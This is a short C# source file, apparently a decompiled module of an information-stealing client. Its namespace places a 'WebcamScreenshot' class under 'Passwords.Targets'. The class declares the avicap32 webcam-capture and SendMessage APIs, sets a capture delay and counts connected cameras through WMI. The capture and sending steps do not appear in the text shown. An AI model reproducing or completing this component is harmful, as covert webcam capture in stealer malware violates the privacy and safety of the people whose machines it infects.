using System;
using System.Management;
using System.Runtime.InteropServices;

namespace Client.Modules.Passwords.Targets.System;

internal sealed class WebcamScreenshot
{
	private static IntPtr Handle;

	private static int delay = 3000;

	[DllImport("avicap32.dll")]
	public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);

	[DllImport("user32")]
	public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

	private static int GetConnectedCamerasCount()
	{
		int num = 0;
		try
		{
			using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')");
			foreach (ManagementBaseObject item in managementObjectSearcher.Get())
			{
				_ = item;
				num++;
			}
			return num;
		}
		catch
		{
			Console.WriteLine("GetConnectedCamerasCount : Query failed");
			return num;
		}
	}
}
